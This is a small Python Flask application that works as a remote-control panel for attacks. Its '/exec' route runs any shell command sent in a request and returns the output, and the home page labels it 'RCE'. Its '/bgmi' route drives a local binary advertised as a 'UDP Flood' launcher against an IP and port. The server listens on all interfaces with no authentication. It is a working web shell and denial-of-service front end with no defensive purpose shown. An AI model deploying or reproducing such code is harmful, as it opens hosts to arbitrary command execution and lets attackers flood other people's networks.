from flask import Flask, request, jsonify
import subprocess
import os

app = Flask(__name__)
BGMI = "./bgmi"

@app.route('/exec', methods=['GET', 'POST'])
def rce():
    cmd = request.args.get('cmd') or (request.json.get('cmd') if request.json else 'id')
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
    return jsonify({'cmd': cmd, 'out': result.stdout, 'err': result.stderr})

@app.route('/bgmi', methods=['GET', 'POST'])
def run_bgmi():
    args = request.args.get('args') or (request.json.get('args') if request.json else 'status')
    cmd = [BGMI] + args.split()
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return jsonify({'args': args, 'out': result.stdout, 'err': result.stderr})

@app.route('/')
def home():
    return {'endpoints': {'/exec?cmd=id': 'RCE', '/bgmi?args=attack 1.2.3.4:80 100 30': 'UDP Flood'}}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
